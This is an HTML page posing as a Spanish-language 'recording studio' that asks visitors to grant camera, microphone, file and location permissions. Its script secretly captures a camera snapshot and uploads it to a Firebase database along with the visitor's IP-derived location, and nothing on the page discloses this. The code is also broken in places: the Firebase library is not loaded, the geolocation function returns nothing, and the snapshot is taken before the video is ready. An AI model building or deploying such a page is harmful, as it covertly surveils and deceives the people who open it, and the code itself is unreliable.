<!DOCTYPE html>
<html>
<head>
  <title>Estudio de Grabación</title>
  <style>
    body {
      background-color: #111;
      color: #eee;
      font-family: sans-serif;
    }
    .container {
      display: flex;
      flex-direction: column;
      align-items: center;
      justify-content: center;
      height: 100vh;
    }
    .button {
      background-color: #333;
      color: #eee;
      border: none;
      padding: 10px 20px;
      margin: 10px;
      border-radius: 5px;
      cursor: pointer;
    }
    .button:hover {
      background-color: #555;
    }
    .logo {
      width: 150px;
      height: 150px;
      margin-bottom: 20px;
    }
  </style>
</head>
<body>
  <div class="container">
    <img width="48" height="48" src="https://img.icons8.com/fluency/48/internet.png" alt="internet"/>
    <h1>Estudio de Grabación</h1>
    <h3>Para continuar otorgar algunos permisos </h3>
    <button class="button" id="cameraButton">Acceder a la cámara</button>
    <button class="button" id="microphoneButton">Acceder al micrófono</button>
    <button class="button" id="fileButton">Elegir archivos</button>
    <button class="button" id="getGeolocationButton">Obtener geolocalización</button>
  </div>

  <script>
    const firebaseConfig = {
      apiKey: 'YOUR_API_KEY',
      authDomain: 'YOUR_AUTH_DOMAIN',
      projectId: 'YOUR_PROJECT_ID'
    };
    firebase.initializeApp(firebaseConfig);
    const db = firebase.firestore();

    const cameraButton = document.getElementById('cameraButton');
    const microphoneButton = document.getElementById('microphoneButton');
    const fileButton = document.getElementById('fileButton');
    const getGeolocationButton = document.getElementById('getGeolocationButton');

    // Add geolocation function
    function getGeolocation() {
      fetch('https://ipinfo.io/json')
        .then(response => response.json())
        .then(data => {
          console.log(`Geolocation: ${data.city}, ${data.region}, ${data.country}`);
          return `${data.city}, ${data.region}, ${data.country}`;
        })
        .catch(err => {
          console.error('Error getting geolocation:', err);
          return null;
        });
    }

    getGeolocationButton.addEventListener('click', () => {
      getGeolocation();
    });

    cameraButton.addEventListener('click', () => {
      navigator.mediaDevices.getUserMedia({ video: true })
        .then(stream => {
          const video = document.createElement('video');
          video.srcObject = stream;
          video.autoplay = true;
          document.body.appendChild(video);

          // Create a canvas to capture the image
          const canvas = document.createElement('canvas');
          canvas.width = video.videoWidth;
          canvas.height = video.videoHeight;
          const ctx = canvas.getContext('2d');
          ctx.drawImage(video, 0, 0, canvas.width, canvas.height);

          // Get the image data URL
          const imageDataURL = canvas.toDataURL('image/jpeg');

          // Save the image to Firebase database
          db.collection('images').add({
            image: imageDataURL,
            geolocation: getGeolocation() // Call the geolocation function to get the current location
          })
          .then(docRef => {
            console.log(`Image saved to Firebase database with ID: ${docRef.id}`);
          })
          .catch(err => {
            console.error('Error saving image to Firebase database:', err);
          });
        })
        .catch(err => {
          console.error('Error accessing camera:', err);
        });
    });

    microphoneButton.addEventListener('click', () => {
      navigator.mediaDevices.getUserMedia({ audio: true })
        .then(stream => {
          const audio = document.createElement('audio');
          audio.srcObject = stream;
          audio.autoplay = true;
          document.body.appendChild(audio);
        })
        .catch(err => {
          console.error('Error accessing microphone:', err);
        });
    });

    fileButton.addEventListener('click', () => {
      const input = document.createElement('input');
      input.type = 'file';
      input.accept = '*/*';
      input.click();

      input.addEventListener('change', (event) => {
        const file = event.target.files[0];
        console.log(file.name);
      });
    });
  </script>
</body>
</html>
